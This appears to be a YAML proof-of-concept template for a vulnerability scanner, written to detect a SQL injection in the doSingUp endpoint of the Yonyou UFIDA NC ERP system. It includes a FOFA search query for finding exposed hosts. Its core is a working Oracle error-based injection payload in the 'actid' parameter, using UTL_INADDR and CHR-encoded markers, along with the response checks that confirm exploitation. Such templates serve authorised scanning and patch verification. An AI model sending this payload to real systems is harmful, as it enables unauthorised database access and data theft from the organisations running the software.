id: poc-yaml-yonyou-ufida-nc-dosingup-sqli
info:
  name: 用友NC doSingUp SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: ufida-nc
  fofa: app="用友-UFIDA-NC"
requests:
- method: GET
  path: /
  expression: status_code == 200 && contains(body,"ufida")
- method: POST
  path: /portal/pt/ActivityNotice/doSingUp
  headers:
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  data: pageId=login&pk_psndoc=1&actid=1' AND 7722=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(122)||CHR(106)||CHR(98)||CHR(113)||(SELECT
    (CASE WHEN (7722=7722) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(120)||CHR(120)||CHR(98)||CHR(113))--
    Jvzs
  expression: status_code == 500 && contains(body,"未知的主机") && contains(body,"qzjbq1qxxbq")
    && contains(body,"SYS.UTL_INADDR")
variables: {}
transport: http
